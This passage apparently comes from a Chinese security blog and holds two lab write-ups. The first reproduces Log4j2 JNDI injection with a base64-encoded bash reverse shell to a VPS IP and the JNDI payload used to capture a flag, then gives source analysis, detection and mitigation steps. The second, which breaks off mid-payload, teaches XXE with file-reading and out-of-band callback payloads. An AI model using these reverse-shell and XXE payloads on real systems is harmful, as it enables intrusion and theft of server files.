ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp\n目前支持的所有 PayloadType 为\nDnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输ReverseShell: 用于 Linux 系统的反弹shell，方便使用TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shellTomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP HeaderShell: true, 推荐使用此方式SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shellWeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shellWeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shellJBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shellWebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell\n目前支持的所有 GadgetType 为\n1.URLDNS2.CommonsBeanutils13.CommonsBeanutils24.CommonsCollectionsK15.CommonsCollectionsK26.C3P07.Jdk7u218.Jre8u209.CVE_2020_255110CVE_2020_2883\nWebsphereBypass 中的 3 个动作：\n1.list：基于XXE查看目标服务器上的目录或文件内容2.upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录3.rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下）\n2. VPS部署ldap服务\n将JNDI注入工具传到vps服务器上并执行如下命令\n反弹shell指令：\nbash -i &gt;&amp; /dev/tcp/your-ip/自己设置的监听端口号 0&gt;&amp;1\n\nJNDI启动方法：\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  xxx.xxx.xxx.xxx\n\n这个地方是反弹shell指令经过base64编码后所得。这串代码里只需改此处和最后面服务器的IP\n-C是执行的bash命令，-c参数后面是执行的具体命令，用双引号引起来 -A 指服务器的IP\n\n将反弹shell指令base64编码后，将一整串启动JNDI代码在vps中运行\n这里使用\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A 124.220.233.26\n\n使用burpsuit抓包，替换payload\nrmi://124.220.233.26:1099/29h4wg$&#123;jndi:rmi://124.220.233.26:1099/29h4wg&#125; //记得url编码\n\n成功反弹shell\n\n\n找到flag\n0x06 Log4j2源码浅析\n\nLog4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。\n\n从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。\n我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包(这里是跟着文章走的，暂时不实操了，用脑子复现一波)\n&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;        &lt;version&gt;2.14.0&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;\n\n在工程目录resources下创建log4j2.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;error&quot;&gt;    &lt;appenders&gt;&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot; &gt;&lt;!--            配置Console的模式布局--&gt;            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;/&gt;        &lt;/Console&gt;    &lt;/appenders&gt;    &lt;loggers&gt;        &lt;root level=&quot;error&quot;&gt;            &lt;appender-ref ref=&quot;Console&quot;/&gt;        &lt;/root&gt;    &lt;/loggers&gt;&lt;/configuration&gt;\nlog4j2中包含两个关键组件LogManager和LoggerContext。LogManager是Log4J2启动的入口，可以初始化对应的LoggerContext。LoggerContext会对配置文件进行解析等其它操作。\n在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果\nimport org.apache.logging.log4j.LogManager;//导入所需的包这里导入了 Apache Log4j 2.x 的 LogManager 和 Logger 类。import org.apache.logging.log4j.Logger;//声明 Logger 对象，创建了一个静态的 Logger 对象 logger，使用 LogManager.getLogger() 方法初始化。//Logger 对象用于记录日志。public class log4j2Rce2 &#123;    private static final Logger logger = LogManager.getLogger(log4j2Rce2.class);    //上述静态对象的初始化：创建一个 Logger 对象，并将其与当前的 log4j2Rce2 类关联起来，以便在该类中记录日志。    public static void main(String[] args) &#123;        String a=&quot;$&#123;java:os&#125;&quot;;        logger.error(a);    &#125;&#125;//在 main 方法中，定义了一个字符串变量 a 并赋值为 &quot;$&#123;java:os&#125;&quot;。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。\n\n\n属性占位符之Interpolator插值器\n\nlog4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:$&#123;prefix:key&#125;。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：\n\n详细信息可以查看官方文档。这些实现类存在于org.apache.logging.log4j.core.lookup包下。\n当参数占位符$&#123;prefix:key&#125;带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符$&#123;key&#125;没有prefix时，Interpolator则会从默认查找器中进行查询。如使用$&#123;jndi:key&#125;时，将会调用JndiLookup的lookup方法 使用jndi(javax.naming)获取value。如下图演示。\n\n\n模式布局\n\nlog4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有PatternLayout，也就是我们在配置文件中PatternLayout字段所指定的属性pattern的值%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n。 %msg表示所输出的消息，其它格式化字符所表示的意义可以查看官方文档。\n\nPatternLayout模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个List&lt;PatternConverter&gt;转换器列表和List&lt;FormattingInfo&gt;格式信息列表。在配置文件PatternLayout标签的pattern属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过PluginManager收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示：\n\n\n本次漏洞关键在于转换器名称msg对应的插件实例为MessagePatternConverter对于日志中的消息内容处理存在问题，这部分是攻击者可控的。MessagePatternConverter会将日志中的消息内容为$&#123;prefix:key&#125;格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。\n\n日志级别\n\nlog4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：fatal(致命的), error, warn, info, debug, trace(堆栈)。 log4j2还定义了一个内置的标准级别intLevel，由数值表示，级别越高数值越小。\n\n当日志级别（调用）大于等于系统设置的intLevel的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中&lt;root level=&quot;error&quot;&gt;值设置intLevel。当然我们也可以通过Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：\n\n0x07 漏洞原理\n首先先来看一下网络上流传最多的payload\n$&#123;jndi:ldap://2lnhn2.ceye.io&#125;\n而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示\nimport org.apache.logging.log4j.Level;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.core.config.Configurator;public class Log4jTEst &#123;    public static void main(String[] args) &#123;        Logger logger = LogManager.getLogger(Log4jTEst.class);        logger.error(&quot;$&#123;jndi:ldap://2lnhn2.ceye.io&#125;&quot;);    &#125;&#125;\n直击漏洞本源，将断点断在org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java中的directEncodeEvent方法上，该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法。log4j2默认布局使用的是PatternLayout，如下图所示：\n\n继续跟进在encode中会调用toText方法，根据注释，该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。\n\n\n接下来会调用serializer.toSerializable，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，\n\n这里整理了一下调用的Converter\norg.apache.logging.log4j.core.pattern.DatePatternConverterorg.apache.logging.log4j.core.pattern.LiteralPatternConverterorg.apache.logging.log4j.core.pattern.ThreadNamePatternConverterorg.apache.logging.log4j.core.pattern.LevelPatternConverterorg.apache.logging.log4j.core.pattern.LoggerPatternConverterorg.apache.logging.log4j.core.pattern.MessagePatternConverter  //消息模式转换器org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverterorg.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter\n这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟\n\n在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符&quot;{&quot;，这三行代码中关键点在于最后一行\n\n这里我圈了几个重点，有助于理解Log4j2 为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示\n09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - $&#123;jndi:ldap://2lnhn2.ceye.io&#125;\n本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是$符号，也就是说$&#123;jndi:ldap://2lnhn2.ceye.io&#125;这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是$&#123;jndi:ldap://2lnhn2.ceye.io&#125;这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进\n\n经过一段的嵌套调用，来到Interpolator.lookup，这里会通过var.indexOf(PREFIX_SEPARATOR)判断&quot;:&quot;之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示\n\n那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示\n\n然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示\n\n说到这里，我们已经详细了解了logger.error()造成RCE的原理：\n前提是`MessagePatternConverter`会将日志中的消息内容为`$&#123;prefix:key&#125;`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。而偏偏是jndi引起漏洞的原因为：\t在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 $&#123;java:...&#125; 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。\n那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值intLevel记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：\n\n当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小\n\n\n跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示\n\n而这里日志优先级数值小于等于200的就只有&quot;error&quot;、“fatal”，这两个，所以logger.fatal()方法也可触发漏洞。但是&quot;warn&quot;、&quot;info&quot;等大于200的就触发不了了。\n但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;Configuration status=&quot;WARN&quot;&gt;   &lt;Appenders&gt;     &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;       &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;     &lt;/Console&gt;   &lt;/Appenders&gt;   &lt;Loggers&gt;     &lt;Root level=&quot;error&quot;&gt;       &lt;AppenderRef ref=&quot;Console&quot;/&gt;     &lt;/Root&gt;   &lt;/Loggers&gt; &lt;/Configuration&gt;\n所以只需要做一点简单的修改，将&lt;Root level=&quot;error&quot;&gt;中的error改成一个优先级比较低的，例如&quot;info&quot;这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt;    &lt;Appenders&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;        &lt;/Console&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;Root level=&quot;info&quot;&gt;            &lt;AppenderRef ref=&quot;Console&quot;/&gt;        &lt;/Root&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;\n关于Jndi部分的远程类加载利用可以参考实验室往常的文章：Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解、JAVA JNDI注入知识详解\n0x08 入侵排查\n1. 日志排查\n攻击者在利用前通常采用dnslog方式进行扫描探测，对于常见利用方式可通过应用系统报错日志中对以下关键字进行排查。\n&quot;javax.naming.CommunicationException&quot;&quot;javax.naming.NamingException: problem generating object using object factory&quot;&quot;Error looking up JNDI resource&quot;\n2. 流量排查\n\n排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字}。\n排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。\n\n0x09 漏洞修复\n\n排查应用是否引入了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。尽快升级Apache Log4j2所有相关应用到最新的版本：https://github.com/apache/logging-log4j2\n缓解措施：\n\n添加 jvm 启动参数 -Dlog4j2.formatMsgNoLookups=true\n在应⽤程序的 classpath 下添加 log4j2.component.properties 配置⽂件⽂件， ⽂件内容：log4j2.formatMsgNoLookups=True\n移除 log4j-core 包中 JndiLookup 类⽂件并重启服务\n\n\n各大厂商针对log4j2漏洞应急方案集合：https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g\n\n参考文章\n前置基础知识参考：https://blog.csdn.net/qq_43531669/article/details/123562530\n复现过程参考1：http://www.luckysec.cn/posts/e991b2d2.html#toc-heading-5\n复现过程参考2：https://blog.csdn.net/weixin_55843787/article/details/124707658?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2漏洞复现-vulfocus&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124707658.142^v91^insertT0,239^v12^insert_chatgpt&amp;spm=1018.2226.3001.4187\n复现过程参考3：https://paper.seebug.org/1789/#0x05\n绕过方法参考：https://www.freebuf.com/articles/network/316590.html\n","categories":["CVE漏洞"],"tags":["CVE系列"]},{"title":"浅析xxe漏洞","url":"/2023/07/29/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E/","content":"浅析xxe漏洞\n一、XML简介\nXML，即Extensible Markdown Language，可扩展标记语言的缩写。XML是一种允许用户对自己的标记语言进行定义的源语言，可以用于标记数据，定义数据类型。XML是标准通用标记语言，具有可扩展性好、内容与形式分离、语法要求严格、保值性好等优点。\nXML与HTML非常相似，但是XML的设计宗旨是用于传输数据，而HTML的设计宗旨是用于展示数据。XML的标签没有被预定义，因此我们可以自己定义标签。\n二、XML语法规则\n接下来，我们来讲解XML语法规则。\n（一）XML基本语法\n一个典型的XML文档如下所示：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;person&gt;&lt;name&gt;Bob&lt;/name&gt;&lt;age&gt;24&lt;/age&gt;&lt;address&gt;1-1-110&lt;/address&gt;&lt;country&gt;China&lt;/country&gt;&lt;major&gt;History&lt;/major&gt;&lt;/person&gt;\n在上述文档中，第一行是XML文档的头部声明，指明了XML文档的版本号和编码。XML对于头部声明并不严格要求，可有可无，但是一般最好写上头部声明。\n在XML文档中，必须存在一个根节点，根节点是其他所有节点的父节点，在上述文档中，根节点是person。在XML中，所有的标签必须成对出现，标签名区分大小写并且标签不能交叉。但是标签名称可以自行定义。\n（二）XML注释\nXML文档中可以使用注释，注释的使用格式如下所示：\n&lt;!--This is annotation--&gt;\n（三）XML属性\nXML支持在标签元素中定义属性，写法类似于HTML，示例如下所示：\n&lt;name len=&quot;3&quot;&gt;Bob&lt;/name&gt;\nXML规定，一个标签可以有多个属性，但是属性的值必须使用引号括起来。\n（四）XML特殊字符处理\nXML如果想表达特殊字符，有两种方法。\n第一种方法是使用转义字符，常用的转义字符如下表所示：\n\n第二种方式是使用CDATA区域，CDATA区域定义如下所示：\n&lt;![CDATA[【CDATA区域内容】]]&gt;\nXML规定，对CDATA区域内的所有特殊字符不进行解析。\n三、XML文档结构\nXML文档结构包括XML声明、DTD类型定义（可选）、文档元素，同时XXE漏洞和DTD文档相关，所以这里主要对DTD进行介绍。\n&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;\n四、DTD介绍\n文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。\n内部文档声名DTD:&lt;!DOCTYPE 根元素 [元素声明]&gt;外部文档声明DTD:&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;DTD文档中有很多重要的关键字如下：DOCTYPE（DTD的声明）ENTITY（实体的声明）SYSTEM、PUBLIC（外部资源申请）\n实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。\n1.1 内部实体声明\n内部声明采用如下格式定义：\n&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;\n声明之后就可以通过“&amp;实体名;”来获取，示例如下\n&lt;!DOCTYPE foo [&lt;!ENTITY test &quot;john&quot;&gt;]&gt;&lt;foo&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;/foo&gt;\n1.2 外部实体声明\nXXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。\n（1）普通实体声明格式如下：\n&lt;!ENTITY 实体名 SYSTEM &quot;URI&quot;&gt;或者&lt;!ENTITY 实体名 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;\n举个例子：\n&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。\n（2）参数实体声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式\n如下：\n&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;\n注意：\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用%实体名;引用(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体(3)和通用实体一样，参数实体也可以外部引用\n1.3 实体类介绍\n参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。\n参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。\n内部实体：&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;外部实体：&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;参数实体：&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;\n1.4 外部实体\n由于XXE漏洞主要是利用引入外部实体，而导致的漏洞，所以这里主要了解外部实体。而外部实体又分为很多的类型。这里面的类型一些是在之前比如文件包含等中提到的一些协议，以及未提及到的协议。\n  外部实体在DTD中使用\n&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;\n根据程序不同，能够引入的实体也是不同的，例如：\n\n上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有\n\n外部实体演示：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt;\n五、XXE漏洞基本介绍\n1.1 XXE漏洞基本概念\nXML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞。\n  XML就是传输和存储数据的一个类型。\n  XXE就是xml的漏洞注入的全称。\n1.2 XXE漏洞危害\nXXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\n1.3 XXE漏洞输出形式\nXXE漏洞的输出显示分为：有回显、无回显。\n  有回显就能够配合协议以及外部引入进行攻击。\n  无回显就需要配合外部引入-反向链接配合。\n1.4 XXE漏洞相关差异\nXML和HTML的差异\n  XML被设计为数据传输和存储数据，其焦点是数据的内容。\n  HTML被设计用来显示数据，其焦点是数据的外观。\n  HTML指在显示信息，而XML指在传输数据。\n六、XXE漏洞检测\n第一步检测XML是否会被成功解析：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;    &lt;root&gt;&amp;name;&lt;/root&gt;\n如果页面输出了my name is nMask，说明xml文件可以被解析。\n\n第二步检测服务器是否支持DTD引用外部实体：\n&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt;  %name;  ]&gt;\n可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。\n\n如果支持引用外部实体，那么很有可能是存在xxe漏洞的。\n七、XXE漏洞测试\n在测试中所有的语句基本上的固定格式，也就是说构建的payload基本上只需要修改调用协议，以及相关的参加即可，其它的格式，都是固定的可以直接使用。\n这里由于某些工具没咋见过,我就先弄php的xxe吧\n1.1.有回显测试\n像之前提到的，如果有回显，那么就可以配合更多的协议或外部引入进行利用。那么这里就先简单测试一下有回显状态。\n1.1.2.有回显案例\n这里我们使用xxe-labs靶场。下载链接：https://github.com/c0ny1/xxe-lab\n1.1.1.1.测试回显位置\n通过测试，能够看到在admin位置是存在回显的，而后面的password位置的1234是没回显的。\n\n1.1.1.2.构建payload\n构建payload后，也是成功的读取到了文件。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY name SYSTEM &quot;file:///c://windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n1.2.无回显测试\n参考：https://xz.aliyun.com/t/3357#toc-0\n  无回显的情况又称为blind xxe可以使用外带数据通道提取数据。而且在正常的环境下，服务器端通常都会把回显取消。因此我们解决该问题最好的办法就是使用外带的方式。\n  其实也就是测试是否支持DTD引用外部实体。\n1.2.1.无回显常规测试案例\n1.2.1.1.关闭报错及输出\n这里我们先把XXElabs靶场的输出及报错都关闭，模拟无回显情况。在账号上面添加一个error_reporting(0);，然后在下面的echo $result;前面添加一个//，即可模拟成功。\n1.2.1.2.抓包测试\n这里我们首先抓包进行测试，可以发现不在出现报错，以及原来显示的位置也不在显示。\n\n1.2.1.3.构建payload\n这里需要在外部搭建一台vps，无回显需要查看服务器的访问日志，当存在访问日志了，那么就可以证明是支持外部实体的，若不存在日志，则证明不支持外部实体，或者被WAF拦截。\npayload：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % shit SYSTEM &quot;http://192.168.10.50/1.txt&quot;&gt;%shit;]&gt;\n1.2.1.4.查看服务器日志\n这里去攻击者服务器上查看一下日志，可以看到在服务器的访问日志中，查看到是存在一条访问日志的，那么就可以证明是支持外部实体的。\n\n1.2.2.无回显DNSlog测试案例\n上面的常规测试是需要我们自己搭建一个vps来进行测试，那么如果在刚开始测试的时候，不方便把自己的服务器地址暴露出来怎么办？\n1.2.2.1.DNSlog方式\n通过DNSlog方式看服务器是否有DNS或者HTTP的请求。但是由于不确定因素以及处于安全角度来考虑使用外部的DNSlog不安全，那么可以使用burp中自带的有官方架设的默认公共服务器上的DNSlog服务器。\nDNSlog位置：\n点击copy to clipboard后(这一步就是复制了子域名)，随后粘贴子域名即可。当请求时就会在下面的窗口中显示相关的请求信息。同时这个窗口不能关闭，若关闭了，那么就会销毁相关的信息。\n\n1.2.2.2.构建payload\n其实这里的payload和之前的payload基本一致。这里需要注意的是，我们复制的子域名是没有http://的需要我们自己添加上去。所以修改下面的payload的时候只需要把http://后面的内容替换即可，设置好后，点击发送。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % d SYSTEM &quot;http://3nrivqeathjejd5mau53iamdk4qveq2f.oastify.com&quot;&gt;%d;]&gt;\n\n1.2.2.3.查看效果\n发送完成后，点击Poll now(现在调查)，当然也可以在复制子域名后就开始轮询，这边可能需要稍等一会就能显示出来，当看到结果后就可以判断是可以使用外部引入的。\n\n1.3.总结\n以上都是简单测试，以及了解相关的payload如何构建，下面才是真实的案例。\n八、任意文件读取\n所谓的任意文件读取，其实也就是读取受害者服务器中的敏感文件。这里同样分为无回显和有回显操作。这里我们使用xxe-labs靶场做演示。\n2.1.有回显案例\n2.1.1.抓包\n我们在打开靶场后，输入账号和密码后对其进行抓包，然后放到重放器中。当然这里的账号和密码随便输都行。\n2.1.2.构建payload\n我们通过构建的payload对Windows中的配置文件，进行读取，也是成功读取了。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;\n\n2.2.无回显案例\n2.2.1.修改配置文件\n这里为了演示修改，我们把xxelabs中的报错和回显都关闭。\n2.2.2.测试是否回显\n通过测试发现是，无法回显了，这里需要注意，若你还是存在回显，那么刷新一些页面重新加载一下。\n\n2.2.3.构建payload\n准备一台攻击服务器，当然本地的使用虚拟机即可，并且开启服务器的访问日志。在根目录下创建一个evil.dtd文件。\n&lt;!ENTITY % 